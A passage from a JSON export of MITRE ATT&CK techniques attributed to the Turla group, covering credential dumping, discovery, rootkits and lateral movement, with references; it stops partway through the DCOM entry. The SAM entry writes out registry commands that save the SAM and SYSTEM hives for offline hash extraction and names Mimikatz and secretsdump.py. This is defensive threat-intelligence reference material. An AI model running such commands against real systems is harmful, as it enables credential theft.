[
  {
    "id": "attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235",
    "platform": "linux|macos|windows",
    "tid": "T1001.002",
    "technique": "Steganography",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "lightneuron",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011",
    "platform": "windows",
    "tid": "T1003.002",
    "technique": "Security Account Manager",
    "tactic": "credential-access",
    "datasources": "command-execution|file-access|windows-registry-key-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
    "technique_references": [
      {
        "source_name": "GitHub Creddump7",
        "url": "https://github.com/Neohapsis/creddump7",
        "description": "Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
    "platform": "windows",
    "tid": "T1003.004",
    "technique": "LSA Secrets",
    "tactic": "credential-access",
    "datasources": "command-execution|windows-registry-key-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
    "technique_references": [
      {
        "source_name": "Passcape LSA Secrets",
        "url": "https://www.passcape.com/index.php?section=docsys&cmd=details&id=23",
        "description": "Passcape. (n.d.). Windows LSA secrets. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AD Admin Tier Model",
        "url": "https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN",
        "description": "Microsoft. (2019, February 14). Active Directory administrative tier model. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury Windows Credentials",
        "url": "https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf",
        "description": "Chad Tilbury. (2017, August 8). 1Windows Credentials: Attack, Mitigation, Defense. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ired Dumping LSA Secrets",
        "url": "https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets",
        "description": "Mantvydas Baranauskas. (2019, November 16). Dumping LSA Secrets. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Powersploit",
        "url": "https://github.com/mattifestation/PowerSploit",
        "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
    "platform": "windows",
    "tid": "T1003.006",
    "technique": "DCSync",
    "tactic": "credential-access",
    "datasources": "active-directory-object-access|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "mimikatz",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
    "technique_references": [
      {
        "source_name": "Microsoft DRSR Dec 2017",
        "url": "https://msdn.microsoft.com/library/cc228086.aspx",
        "description": "Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetNCCChanges",
        "url": "https://msdn.microsoft.com/library/dd207691.aspx",
        "description": "Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Samba DRSUAPI",
        "url": "https://wiki.samba.org/index.php/DRSUAPI",
        "description": "SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wine API samlib.dll",
        "url": "https://source.winehq.org/WineAPI/samlib.html",
        "description": "Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Mimikatz DCSync",
        "url": "https://adsecurity.org/?p=1729",
        "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Mimikatz and DCSync",
        "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
        "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "InsiderThreat ChangeNTLM July 2017",
        "url": "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM",
        "description": "Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Mimikatz lsadump Module",
        "url": "https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump",
        "description": "Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NRPC Dec 2017",
        "url": "https://msdn.microsoft.com/library/cc237008.aspx",
        "description": "Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SAMR",
        "url": "https://msdn.microsoft.com/library/cc245496.aspx",
        "description": "Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity DCSync Sept 2015",
        "url": "https://adsecurity.org/?p=1729",
        "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y DCSync Sept 2015",
        "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
        "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
    "platform": "linux|macos|windows|network",
    "tid": "T1005",
    "technique": "Data from Local System",
    "tactic": "collection",
    "datasources": "command-execution|file-access|os-api-execution|process-creation|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch|kazuar|lightneuron|tinyturla",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information. Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
    "technique_references": [
      {
        "source_name": "Mandiant APT41 Global Intrusion ",
        "url": "https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits",
        "description": "Gyler, C.,Perez D.,Jones, S.,Miller, S.. (2021, February 25). This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits. Retrieved February 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa",
    "platform": "windows|macos|linux",
    "tid": "T1007",
    "technique": "System Service Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic",
    "correlation_tool": "net|tasklist",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/574.html",
        "description": "none",
        "external_id": "CAPEC-574"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433",
    "platform": "linux|windows|macos",
    "tid": "T1008",
    "technique": "Fallback Channels",
    "tactic": "command-and-control",
    "datasources": "network-connection-creation|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch|kazuar|tinyturla",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830",
    "platform": "macos|windows|linux",
    "tid": "T1010",
    "technique": "Application Window Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.(Citation: Prevailion DarkWatchman 2021)",
    "technique_references": [
      {
        "source_name": "Prevailion DarkWatchman 2021",
        "url": "https://www.prevailion.com/darkwatchman-new-fileless-techniques/",
        "description": "Smith, S., Stafford, M. (2021, December 14). DarkWatchman: A new evolution in fileless techniques. Retrieved January 10, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
    "platform": "windows",
    "tid": "T1012",
    "technique": "Query Registry",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation|windows-registry-key-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|epic|tinyturla",
    "correlation_tool": "reg",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/647.html",
        "description": "none",
        "external_id": "CAPEC-647"
      },
      {
        "source_name": "Wikipedia Windows Registry",
        "url": "https://en.wikipedia.org/wiki/Windows_Registry",
        "description": "Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
    "platform": "linux|macos|windows",
    "tid": "T1014",
    "technique": "Rootkit",
    "tactic": "defense-evasion",
    "datasources": "drive-modification|file-modification|firmware-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "uroburos",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
    "technique_references": [
      {
        "source_name": "CrowdStrike Linux Rootkit",
        "url": "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
        "description": "Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat Mac OSX Rootkit",
        "url": "http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf",
        "description": "Pan, M., Tsai, S. (2014). You can’t see me: A Mac OS X Rootkit uses the tricks you haven't known yet. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec Windows Rootkits",
        "url": "https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf",
        "description": "Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Rootkit",
        "url": "https://en.wikipedia.org/wiki/Rootkit",
        "description": "Wikipedia. (2016, June 1). Rootkit. Retrieved June 2, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/552.html",
        "description": "none",
        "external_id": "CAPEC-552"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
    "platform": "linux|macos|windows|network",
    "tid": "T1016",
    "technique": "System Network Configuration Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation|script-execution",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1016.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|epic|kazuar|lightneuron|mosquito|penquin",
    "correlation_tool": "arp|empire|nbtscan|nbtstat",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes.(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
    "technique_references": [
      {
        "source_name": "Mandiant APT41 Global Intrusion ",
        "url": "https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits",
        "description": "Gyler, C.,Perez D.,Jones, S.,Miller, S.. (2021, February 25). This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits. Retrieved February 17, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/309.html",
        "description": "none",
        "external_id": "CAPEC-309"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc",
    "platform": "windows|linux|macos",
    "tid": "T1016.001",
    "technique": "Internet Connection Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
    "technique_references": [],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
    "platform": "linux|macos|windows|network",
    "tid": "T1018",
    "technique": "Remote System Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|file-access|network-connection-creation|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|epic",
    "correlation_tool": "arp|nbtscan|net",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network.(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
    "technique_references": [
      {
        "source_name": "CISA AR21-126A FIVEHANDS May 2021",
        "url": "https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a",
        "description": "CISA. (2021, May 6). Analysis Report (AR21-126A) FiveHands Ransomware. Retrieved June 7, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic - Koadiac Detection with EQL",
        "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
        "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/292.html",
        "description": "none",
        "external_id": "CAPEC-292"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
    "platform": "windows",
    "tid": "T1021.002",
    "technique": "SMB/Windows Admin Shares",
    "tactic": "lateral-movement",
    "datasources": "command-execution|logon-session-creation|network-connection-creation|network-share-access|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "",
    "correlation_tool": "net|psexec",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/561.html",
        "description": "none",
        "external_id": "CAPEC-561"
      },
      {
        "source_name": "Wikipedia Server Message Block",
        "url": "https://en.wikipedia.org/wiki/Server_Message_Block",
        "description": "Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet RPC",
        "url": "https://technet.microsoft.com/en-us/library/cc787851.aspx",
        "description": "Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Admin Shares",
        "url": "http://support.microsoft.com/kb/314984",
        "description": "Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Lateral Movement Payne",
        "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts",
        "description": "Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Event Forwarding Payne",
        "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem",
        "description": "Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting WMI Persistence",
        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd",
    "platform": "windows",
    "tid": "T1021.003",
    "technique": "Distributed Component Object Model",
    "tactic": "lateral-movement",
    "datasources": "module-load|network-connection-creation|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data 